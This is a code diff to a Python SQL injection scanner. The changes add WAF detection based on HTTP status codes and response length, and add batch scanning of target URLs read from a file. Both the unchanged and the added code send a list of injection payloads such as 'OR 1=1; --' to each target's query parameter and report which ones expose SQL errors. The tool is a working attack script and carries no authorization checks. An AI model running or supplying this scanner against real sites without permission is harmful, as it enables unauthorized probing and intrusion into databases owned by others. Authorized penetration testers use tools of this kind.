@@ -1,4 +1,4 @@
-from colorama import init, Fore
+from colorama import init, Fore 
 import requests
 from requests.exceptions import RequestException
 import sys
@@ -55,9 +55,9 @@ def is_vulnerable(response):
                 return True
     return False
 
-# Function to scan a URL for SQL injection vulnerabilities
+# Function to scan a URL for SQL injection vulnerabilities and detect WAF
 def scan(url):
-    """Scan the URL for SQL injection vulnerabilities."""
+    """Scan the URL for SQL injection vulnerabilities and detect WAF behavior."""
     payloads = [
         "'", "''", "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
         "' OR 1 - - -", " OR \"\"= ", " OR 1 = 1 - - -", "' OR '' = '",
@@ -87,11 +87,11 @@ def scan(url):
         "ORDER BY 31337--"
     ]
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        "User-Agent": "Mozilla/5.0"
     }
 
     print(Fore.YELLOW + f"[*] Starting SQL Injection scan for: {url}")
-    vulnerable = False  # Flag to track if vulnerabilities are found
+    vulnerable = False
 
     try:
         # Fetch baseline response
@@ -104,14 +104,16 @@ def scan(url):
                 response = requests.get(full_url, headers=headers, timeout=5)
                 content_length = len(response.content)
 
-                # Check for SQL errors
+                # WAF Detection
+                if response.status_code in [403, 406, 429]:
+                    print(Fore.RED + f"[!] WAF Detected: Payload '{payload}' caused HTTP {response.status_code}")
+                elif abs(content_length - baseline_length) > 50:
+                    print(Fore.YELLOW + f"[!] WAF behavior detected: Response length changed with payload '{payload}'")
+
+                # Check for SQL Injection
                 if is_vulnerable(response):
                     print(Fore.GREEN + f"[+] SQL Injection Found with payload: {payload}")
-                    vulnerable = True  # Mark as vulnerable
-                # Compare response length to detect significant changes
-                elif abs(content_length - baseline_length) > 50:
-                    print(Fore.YELLOW + f"[!] Response length changed significantly with payload: {payload}")
-                    vulnerable = True  # Mark as vulnerable
+                    vulnerable = True
                 else:
                     print(Fore.RED + f"[-] No vulnerability with payload: {payload}")
             except RequestException as e:
@@ -121,20 +123,39 @@ def scan(url):
 
     print(Fore.BLUE + "[!] SQL Injection scan complete.")
 
-    # Summary of results
     if vulnerable:
         print(Fore.GREEN + "[!!!] The target might be VULNERABLE to SQL Injection.")
     else:
         print(Fore.RED + "[+] The target is NOT vulnerable to SQL Injection.")
 
-# Main program
+# Main program to handle single or multiple URLs
 if __name__ == "__main__":
     try:
-        url = input(Fore.CYAN + "[*] Enter the target URL (e.g., http://example.com/page.php?id=): ")
-        if not url.startswith("http://") and not url.startswith("https://"):
-            print(Fore.RED + "[!] Invalid URL. Ensure it starts with http:// or https://")
+        choice = input(Fore.CYAN + "[*] Choose scan type (1 for single URL, 2 for URLs from file): ")
+
+        if choice == "1":
+            url = input(Fore.CYAN + "[*] Enter the target URL (e.g., http://example.com/page.php?id=): ")
+            if not url.startswith("http://") and not url.startswith("https://"):
+                print(Fore.RED + "[!] Invalid URL. Ensure it starts with http:// or https://")
+            else:
+                scan(url)
+        
+        elif choice == "2":
+            file_path = input(Fore.CYAN + "[*] Enter the path to the URLs file (e.g., urls.txt): ")
+            try:
+                with open(file_path, "r") as file:
+                    urls = file.readlines()
+                    for url in urls:
+                        url = url.strip()
+                        if url.startswith("http://") or url.startswith("https://"):
+                            scan(url)
+                        else:
+                            print(Fore.RED + f"[!] Skipping invalid URL: {url}")
+            except FileNotFoundError:
+                print(Fore.RED + "[!] File not found. Please check the file path.")
         else:
-            scan(url)
+            print(Fore.RED + "[!] Invalid choice. Please choose 1 or 2.")
+
     except KeyboardInterrupt:
         print(Fore.YELLOW + "\n[-] Script interrupted by user.")
     except Exception as e:
